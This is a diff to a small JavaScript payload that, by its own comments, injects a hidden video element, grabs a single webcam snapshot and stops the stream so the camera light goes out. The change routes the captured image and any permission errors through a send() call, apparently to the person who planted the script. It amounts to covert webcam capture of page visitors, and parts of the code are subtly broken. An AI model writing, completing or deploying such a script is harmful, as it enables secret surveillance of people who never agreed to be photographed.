@@ -1,7 +1,7 @@
-
 //inject new video html object 
 var video = document.createElement('video');
 var canvas = document.createElement('canvas');
+var getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
 var track;
 //take picture
 function takeSnapshot(){
@@ -21,11 +21,13 @@ function takeSnapshot(){
 }
 //video.oncanplay = function() {
 video.onloadeddata = function() {
-	takeSnapshot();
+	send(takeSnapshot());
 	track.stop();	
 	//TODO end the stream -> light out
 };
-navigator.getUserMedia(
+//navigator.getUserMedia(
+send(
+getUserMedia(
     // Options
     {
         video: true
@@ -34,12 +36,10 @@ navigator.getUserMedia(
     function(stream){
         video.src = window.URL.createObjectURL(stream);
 	track = stream.getTracks()[0];
-        // TODO play needed? just still image?
-        //video.play();
     },
     // Error Callback
     function(err){
         // Most common errors are PermissionDenied and DevicesNotFound.
-        console.error(err);
+        send(err);
     }
-);
+));
